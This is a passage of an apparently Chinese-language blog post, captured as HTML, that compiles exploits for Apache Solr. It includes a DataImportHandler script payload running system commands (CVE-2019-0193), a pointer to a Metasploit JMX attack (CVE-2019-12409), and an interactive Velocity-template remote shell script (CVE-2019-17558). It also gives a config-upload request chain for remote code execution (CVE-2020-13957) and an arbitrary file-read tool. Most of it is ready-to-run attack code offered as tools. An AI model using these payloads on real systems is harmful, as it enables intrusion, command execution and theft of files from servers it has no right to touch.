class="line">command&#x3D;full-import&amp;verbose&#x3D;false&amp;clean&#x3D;false&amp;commit&#x3D;false&amp;debug&#x3D;true&amp;core&#x3D;tika&amp;name&#x3D;dataimport&amp;dataConfig&#x3D;</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">  &lt;dataSource type&#x3D;&quot;URLDataSource&quot;&#x2F;&gt;</span><br><span class="line">  &lt;script&gt;&lt;![CDATA[</span><br><span class="line">          function poc(row)&#123;</span><br><span class="line"> var bufReader &#x3D; new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(&quot;cmd &#x2F;c whoami&quot;).getInputStream()));</span><br><span class="line">var result &#x3D; [];</span><br><span class="line">while(true) &#123;</span><br><span class="line">var oneline &#x3D; bufReader.readLine();</span><br><span class="line">result.push( oneline );</span><br><span class="line">if(!oneline) break;</span><br><span class="line">&#125;</span><br><span class="line">row.put(&quot;title&quot;,result.join(&quot;\n\r&quot;));</span><br><span class="line">return row;</span><br><span class="line">&#125;</span><br><span class="line">  ]]&gt;&lt;&#x2F;script&gt;</span><br><span class="line">        &lt;document&gt;</span><br><span class="line">                &lt;entity name&#x3D;&quot;slashdot&quot;</span><br><span class="line">                        pk&#x3D;&quot;link&quot;                      url&#x3D;&quot;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;1135&#x2F;solr_exploit&#x2F;master&#x2F;URLDataSource&#x2F;demo.xml&quot;</span><br><span class="line">                        processor&#x3D;&quot;XPathEntityProcessor&quot;</span><br><span class="line">                        forEach&#x3D;&quot;&#x2F;RDF&#x2F;channel | &#x2F;RDF&#x2F;item&quot;</span><br><span class="line">                        transformer&#x3D;&quot;script:poc&quot;&gt;</span><br><span class="line">                        &lt;field column&#x3D;&quot;subject&quot;      xpath&#x3D;&quot;&#x2F;RDF&#x2F;channel&#x2F;subject&quot; commonField&#x3D;&quot;true&quot; &#x2F;&gt;</span><br><span class="line">                        &lt;field column&#x3D;&quot;title&quot;        xpath&#x3D;&quot;&#x2F;RDF&#x2F;item&#x2F;title&quot; &#x2F;&gt;</span><br><span class="line">                        &lt;field column&#x3D;&quot;link&quot;         xpath&#x3D;&quot;&#x2F;RDF&#x2F;item&#x2F;link&quot; &#x2F;&gt;</span><br><span class="line">                &lt;&#x2F;entity&gt;</span><br><span class="line">        &lt;&#x2F;document&gt;</span><br><span class="line">&lt;&#x2F;dataConfig&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST &#x2F;solr&#x2F;&lt;your_core_name&gt;&#x2F;dataimport HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1:8983</span><br><span class="line">Content-Length: 763</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0</span><br><span class="line">Content-type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">command&#x3D;full-import&amp;verbose&#x3D;false&amp;clean&#x3D;false&amp;commit&#x3D;true&amp;debug&#x3D;true&amp;core&#x3D;&lt;your_core_name&gt;&amp;name&#x3D;dataimport&amp;dataConfig&#x3D;</span><br><span class="line">&lt;dataConfig&gt;</span><br><span class="line">&lt;dataSource type&#x3D;&quot;URLDataSource&quot;&#x2F;&gt;</span><br><span class="line">&lt;script&gt;&lt;![CDATA[</span><br><span class="line">function poc(row)&#123;</span><br><span class="line">var process&#x3D; java.lang.Runtime.getRuntime();</span><br><span class="line">process.exec(&quot;calc&quot;);</span><br><span class="line">return row;</span><br><span class="line">&#125;</span><br><span class="line">]]&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;document&gt;</span><br><span class="line">&lt;entity name&#x3D;&quot;stackoverflow&quot;</span><br><span class="line">url&#x3D;&quot;https:&#x2F;&#x2F;stackoverflow.com&#x2F;feeds&#x2F;tag&#x2F;solr&quot;</span><br><span class="line">processor&#x3D;&quot;XPathEntityProcessor&quot;</span><br><span class="line">forEach&#x3D;&quot;&#x2F;feed&quot;</span><br><span class="line">transformer&#x3D;&quot;script:poc&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;document&gt;</span><br></pre></td></tr></table></figure>
+<p>工具：cve-2019-0193_cmd.py</p>
+<h1 id="CVE-2019-12409-LINUX-RCE"><a href="#CVE-2019-12409-LINUX-RCE" class="headerlink" title="CVE-2019-12409-LINUX-RCE"></a>CVE-2019-12409-LINUX-RCE</h1><p>APACHE SOLR 8.1.1/8.2.0</p>
+<p>Apache Solr的8.1.1和8.2.0发行版中的默认配置文件solr.in.sh,在其配置文件中ENABLE_REMOTE_JMX_OPTS字段默认配置不安全.如果使用受影响版本中的默认配置,那么将启用JMX监视服务并将对公网监听一个18983的RMI端口,且无需进行任何身份验证,配合JMX RMI将会导致远程代码执行。</p>
+<p>直接msf的jmx打18983</p>
+<h1 id="CVE-2019-17558-RCE"><a href="#CVE-2019-17558-RCE" class="headerlink" title="CVE-2019-17558-RCE"></a>CVE-2019-17558-RCE</h1><p>Apache Solr 5.x到8.2.0版本-RCE</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python3</span><br><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line"># author:zhzyker</span><br><span class="line"># from:https:&#x2F;&#x2F;github.com&#x2F;zhzyker&#x2F;exphub</span><br><span class="line"># telegram:t.me&#x2F;zhzyker</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!&#x3D;2:</span><br><span class="line">    print(&#39;+------------------------------------------------------------+&#39;)</span><br><span class="line">    print(&#39;+ DES: by zhzyker as https:&#x2F;&#x2F;github.com&#x2F;zhzyker&#x2F;exphub       +&#39;)</span><br><span class="line">    print(&#39;+      Apache Solr Velocity Commons Remote Code Execution    +&#39;)</span><br><span class="line">    print(&#39;+------------------------------------------------------------+&#39;)</span><br><span class="line">    print(&#39;+ USE: python3 cve-2019-17558_cmd.py &lt;url&gt;                   +&#39;)</span><br><span class="line">    print(&#39;+ EXP: python3 cve-2019-17558_cmd.py http:&#x2F;&#x2F;1.1.1.1:8983     +&#39;)</span><br><span class="line">    print(&#39;+ VER: Apache Solr 5.0.0 - 8.3.1                             +&#39;)</span><br><span class="line">    print(&#39;+------------------------------------------------------------+&#39;)</span><br><span class="line">    sys.exit(0)</span><br><span class="line">    </span><br><span class="line">url &#x3D; sys.argv[1]</span><br><span class="line"></span><br><span class="line">core_url &#x3D; url + &quot;&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json&quot;</span><br><span class="line">try:</span><br><span class="line">    r &#x3D; requests.request(&quot;GET&quot;, url&#x3D;core_url, timeout&#x3D;10)</span><br><span class="line">    core_name &#x3D; list(json.loads(r.text)[&quot;status&quot;])[0]</span><br><span class="line">    print (&quot;[+] GET API: &quot;+url+&quot;&#x2F;solr&#x2F;&quot;+core_name+&quot;&#x2F;config&quot;)</span><br><span class="line">except:</span><br><span class="line">    print (&quot;[-] Target Not Vuln Good Luck&quot;)</span><br><span class="line">    sys.exit(0)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">api_url &#x3D; url + &quot;&#x2F;solr&#x2F;&quot; +core_name+ &quot;&#x2F;config&quot;</span><br><span class="line">headers &#x3D; &#123;&quot;Content-Type&quot;: &quot;application&#x2F;json&quot;&#125;</span><br><span class="line">set_api_data &#x3D;&quot;&quot;&quot;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;update-queryresponsewriter&quot;: &#123;</span><br><span class="line">    &quot;startup&quot;: &quot;lazy&quot;,</span><br><span class="line">    &quot;name&quot;: &quot;velocity&quot;,</span><br><span class="line">    &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;,</span><br><span class="line">    &quot;template.base.dir&quot;: &quot;&quot;,</span><br><span class="line">    &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,</span><br><span class="line">    &quot;params.resource.loader.enabled&quot;: &quot;true&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">api &#x3D; requests.request(&quot;POST&quot;, url&#x3D;api_url, data&#x3D;set_api_data, headers&#x3D;headers)</span><br><span class="line">code &#x3D; str(api.status_code)</span><br><span class="line">if api.status_code &#x3D;&#x3D; 200:</span><br><span class="line">    print (&quot;[+] &lt;HTTP&quot; +code+ &quot;&gt; SET API Success&quot;)</span><br><span class="line">else:</span><br><span class="line">    print (&quot;[-] &lt;HTTP&quot; +code+ &quot;&gt; SET API Failed Good Luck&quot;)</span><br><span class="line">    sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def do_exp(cmd):</span><br><span class="line">    vuln_url &#x3D; url+&quot;&#x2F;solr&#x2F;&quot;+core_name+&quot;&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27&quot;+cmd+&quot;%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end&quot;</span><br><span class="line">    r &#x3D; requests.request(&quot;GET&quot;, vuln_url)</span><br><span class="line">    print (r.text)</span><br><span class="line"></span><br><span class="line">while 1:</span><br><span class="line">    cmd &#x3D; input(&quot;Shell &gt;&gt;&gt; &quot;)</span><br><span class="line">    if cmd &#x3D;&#x3D; &quot;exit&quot; : exit(0)</span><br><span class="line">    do_exp(cmd)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>工具：cve-2019-17558_cmd.py</p>
+<h1 id="CVE-2020-13957-文件上传-RCE"><a href="#CVE-2020-13957-文件上传-RCE" class="headerlink" title="CVE-2020-13957-文件上传-RCE"></a>CVE-2020-13957-文件上传-RCE</h1><p>solr没法解析，通过上传有漏洞的配置文件达成RCE</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">Apache Solr 6.6.0 -6.6.5</span><br><span class="line"></span><br><span class="line">Apache Solr 7.0.0 -7.7.3</span><br><span class="line"></span><br><span class="line">Apache Solr 8.0.0 -8.6.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">不同版本需要不同的conf</span><br><span class="line"></span><br><span class="line">只有在开启了solr cloud的情况下才能进行上传</span><br><span class="line"></span><br><span class="line">\server\solr\configsets\_default\conf目录下的solrconfig.xml文件中params.resource.loader.enabled的值设置为true(为远程命令执行做准备)，conf目录下所有文件打包成一个压缩文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1、上传自定义配置</span><br><span class="line">POST &#x2F;solr&#x2F;admin&#x2F;configs?action&#x3D;UPLOAD&amp;name&#x3D;file11 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.156.1:8983</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.156.1:8983&#x2F;solr&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh;q&#x3D;0.9,zh-CN;q&#x3D;0.8</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type:application&#x2F;octet-stream</span><br><span class="line">Content-Length: 75398</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2、根据baseConfigSet配置，创建新配置</span><br><span class="line">GET &#x2F;solr&#x2F;admin&#x2F;configs?action&#x3D;CREATE&amp;name&#x3D;file33&amp;baseConfigSet&#x3D;file11&amp;configSetProp.immutable&#x3D;false&amp;wt&#x3D;xml&amp;omitHeader&#x3D;true HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.156.1:8983</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.156.1:8983&#x2F;solr&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh;q&#x3D;0.9,zh-CN;q&#x3D;0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3、根据创建的新配置，创建Collection</span><br><span class="line">GET &#x2F;solr&#x2F;admin&#x2F;collections?action&#x3D;CREATE&amp;numShards&#x3D;1&amp;name&#x3D;file22&amp;collection.configName&#x3D;file33 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.156.1:8983</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.156.1:8983&#x2F;solr&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh;q&#x3D;0.9,zh-CN;q&#x3D;0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4、利用cve-2019-17558进行RCE</span><br><span class="line">GET &#x2F;solr&#x2F;file22&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;&#39;&#39;)+%23set($rt&#x3D;$x.class.forName(&#39;java.lang.Runtime&#39;))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27systeminfo%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.156.1:8983</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;86.0.4240.111 Safari&#x2F;537.36</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.156.1:8983&#x2F;solr&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-TW,zh;q&#x3D;0.9,zh-CN;q&#x3D;0.8</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<h1 id="2021任意文件读取"><a href="#2021任意文件读取" class="headerlink" title="2021任意文件读取"></a>2021任意文件读取</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line">import re</span><br><span class="line">import base64</span><br><span class="line">import time</span><br><span class="line">from lxml import etree</span><br><span class="line">import json</span><br><span class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</span><br><span class="line"></span><br><span class="line">def title():</span><br><span class="line">    print(&#39;+------------------------------------------&#39;)</span><br><span class="line">    print(&#39;+  \033[34mPOC_Des: http:&#x2F;&#x2F;wiki.peiqi.tech           \033[0m&#39;)</span><br><span class="line">    print(&#39;+  \033[34mGithub : https:&#x2F;&#x2F;github.com&#x2F;PeiQi0        \033[0m&#39;)</span><br><span class="line">    print(&#39;+  \033[34m公众号  : PeiQi文库                        \033[0m&#39;)</span><br><span class="line">    print(&#39;+  \033[34mVersion: Apache Solr &lt; 8.8.1            \033[0m&#39;)</span><br><span class="line">    print(&#39;+  \033[36m使用格式: python3 poc.py               \033[0m&#39;)</span><br><span class="line">    print(&#39;+  \033[36mUrl    &gt;&gt;&gt; http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8983  \033[0m&#39;)</span><br><span class="line">    print(&#39;+  \033[36mFile   &gt;&gt;&gt; 文件名称或目录                  \033[0m&#39;)</span><br><span class="line">    print(&#39;+------------------------------------------&#39;)</span><br><span class="line"></span><br><span class="line">def POC_1(target_url):</span><br><span class="line">    core_url &#x3D; target_url + &quot;&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json&quot;</span><br><span class="line">    try:</span><br><span class="line">        response &#x3D; requests.request(&quot;GET&quot;, url&#x3D;core_url, timeout&#x3D;10)</span><br><span class="line">        core_name &#x3D; list(json.loads(response.text)[&quot;status&quot;])[0]</span><br><span class="line">        print(&quot;\033[32m[o] 成功获得core_name,Url为：&quot; + target_url + &quot;&#x2F;solr&#x2F;&quot; + core_name + &quot;&#x2F;config\033[0m&quot;)</span><br><span class="line">        return core_name</span><br><span class="line">    except:</span><br><span class="line">        print(&quot;\033[31m[x] 目标Url漏洞利用失败\033[0m&quot;)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">def POC_2(target_url, core_name):</span><br><span class="line">    vuln_url &#x3D; target_url + &quot;&#x2F;solr&#x2F;&quot; + core_name + &quot;&#x2F;config&quot;</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &quot;Content-type&quot;:&quot;application&#x2F;json&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    data &#x3D; &#39;&#123;&quot;set-property&quot; : &#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125;&#39;</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response &#x3D; requests.post(url&#x3D;vuln_url, data&#x3D;data, headers&#x3D;headers, verify&#x3D;False, timeout&#x3D;5)</span><br><span class="line">        print(&quot;\033[36m[o] 正在准备文件读取...... \033[0m&quot;.format(target_url))</span><br><span class="line">        if &quot;This&quot; in response.text and response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">            print(&quot;\033[32m[o] 目标 &#123;&#125; 可能存在漏洞 \033[0m&quot;.format(target_url))</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;\033[31m[x] 目标 &#123;&#125; 不存在漏洞\033[0m&quot;.format(target_url))</span><br><span class="line">            sys.exit(0)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 请求失败 \033[0m&quot;, e)</span><br><span class="line"></span><br><span class="line">def POC_3(target_url, core_name, File_name):</span><br><span class="line">    vuln_url &#x3D; target_url + &quot;&#x2F;solr&#x2F;&#123;&#125;&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams&quot;.format(core_name)</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    data &#x3D; &#39;stream.url&#x3D;file:&#x2F;&#x2F;&#123;&#125;&#39;.format(File_name)</span><br><span class="line">    try:</span><br><span class="line">        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">        response &#x3D; requests.post(url&#x3D;vuln_url, data&#x3D;data, headers&#x3D;headers, verify&#x3D;False, timeout&#x3D;5)</span><br><span class="line">        if &quot;No such file or directory&quot; in response.text:</span><br><span class="line">            print(&quot;\033[31m[x] 读取&#123;&#125;失败 \033[0m&quot;.format(File_name))</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;\033[36m[o] 响应为:\n&#123;&#125; \033[0m&quot;.format(json.loads(response.text)[&quot;streams&quot;][0][&quot;stream&quot;]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(&quot;\033[31m[x] 请求失败 \033[0m&quot;, e)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    title()</span><br><span class="line">    target_url &#x3D; str(input(&quot;\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">    core_name &#x3D; POC_1(target_url)</span><br><span class="line">    POC_2(target_url, core_name)</span><br><span class="line">    while True:</span><br><span class="line">        File_name &#x3D; str(input(&quot;\033[35mFile &gt;&gt;&gt; \033[0m&quot;))</span><br><span class="line">        POC_3(target_url, core_name, File_name)</span><br></pre></td></tr></table></figure>
+<p>工具：solr-fr.py</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Apache-Solr/" rel="tag"># Apache-Solr</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/04/13/Apache-SkyWalking/" rel="prev" title="Apache-SkyWalking">
+                  <i class="fa fa-chevron-left"></i> Apache-SkyWalking
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/04/14/apache-flink/" rel="next" title="apache-flink">
+                  apache-flink <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">nicaishui</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">221k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:21</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class=""></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class=""></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
